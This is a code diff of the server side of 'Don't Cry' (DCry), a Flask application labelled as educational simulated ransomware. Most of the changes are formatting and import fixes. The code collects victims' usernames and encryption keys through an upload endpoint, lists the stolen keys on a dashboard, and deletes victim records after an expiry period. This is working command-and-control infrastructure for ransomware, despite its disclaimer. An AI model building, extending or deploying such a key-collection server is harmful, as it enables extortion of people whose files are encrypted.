@@ -1,5 +1,5 @@
-################################################################################ 
-#                             Don't Cry Ransomware                             # 
+################################################################################
+#                             Don't Cry Ransomware                             #
 #                          ! EDUCATIONAL PURPOSES ONLY !                       #
 ################################################################################
 # DISCLAIMER: This is a simulated ransomware (DCry), written for cybersecurity
@@ -9,11 +9,12 @@
 # under supervision of cybersecurity professionals.
 # The authors assume no liability for any misuse or damage caused.
 
-from flask import Flask, request, render_template_string, redirect, url_for
+import re
 import os
 import shutil
-from markupsafe import escape as flask_escape
 from datetime import datetime, timedelta
+from markupsafe import escape as flask_escape
+from flask import Flask, request, render_template_string, redirect, url_for
 
 app = Flask(__name__)
 
@@ -21,13 +22,15 @@ VICTIM_FOLDER = os.path.abspath(os.path.expanduser("~/dcry_victims/"))
 
 os.makedirs(VICTIM_FOLDER, exist_ok=True)
 
+
 def sanitize_path_component(component):
     if not component:
         return "_"
-    component = re.sub(r'[^a-zA-Z0-9_-]', '_', component)
+    component = re.sub(r"[^a-zA-Z0-9_-]", "_", component)
     if component == "." or component == "..":
         return "_"
     return component
+
 
 def victim_is_expired(date_str, days_valid=3):
     try:
@@ -36,10 +39,12 @@ def victim_is_expired(date_str, days_valid=3):
     except Exception:
         return False
 
+
 def delete_victim(victim_id):
     path = os.path.join(VICTIM_FOLDER, victim_id)
     if os.path.isdir(path):
         shutil.rmtree(path)
+
 
 @app.route("/upload", methods=["POST"])
 def upload():
@@ -54,18 +59,17 @@ def upload():
     folder = os.path.join(VICTIM_FOLDER, vid)
     os.makedirs(folder, exist_ok=True)
 
-    # Save victim info
     info_path = os.path.join(folder, "info.txt")
     with open(info_path, "w") as f:
         f.write(f"username={username}\n")
         f.write(f"date={date}\n")
 
-    # Save key
     key_path = os.path.join(folder, "key.txt")
     with open(key_path, "w") as f:
         f.write(key)
 
     return "Upload success."
+
 
 @app.route("/dashboard")
 def dashboard():
@@ -98,12 +102,14 @@ def dashboard():
                 with open(key_path, "r") as f:
                     key = f.read()
 
-                victims_data.append({
-                    "username": flask_escape(info.get("username", "")),
-                    "id": flask_escape(vid_safe),
-                    "date": flask_escape(info.get("date", "")),
-                    "key": flask_escape(key)
-                })
+                victims_data.append(
+                    {
+                        "username": flask_escape(info.get("username", "")),
+                        "id": flask_escape(vid_safe),
+                        "date": flask_escape(info.get("date", "")),
+                        "key": flask_escape(key),
+                    }
+                )
             except Exception as e:
                 app.logger.error(f"Error reading victim data for {vid_safe}: {e}")
                 continue
@@ -157,6 +163,7 @@ def dashboard():
 
     return render_template_string(html, victims=victims_data)
 
+
 @app.route("/delete_victim", methods=["POST"])
 def delete_victim_route():
     victim_id_raw = request.form.get("victim_id")
@@ -165,6 +172,7 @@ def delete_victim_route():
         return "Invalid victim ID.", 400
     delete_victim(victim_id)
     return redirect(url_for("dashboard"))
+
 
 if __name__ == "__main__":
     app.run(host="0.0.0.0", port=8080)
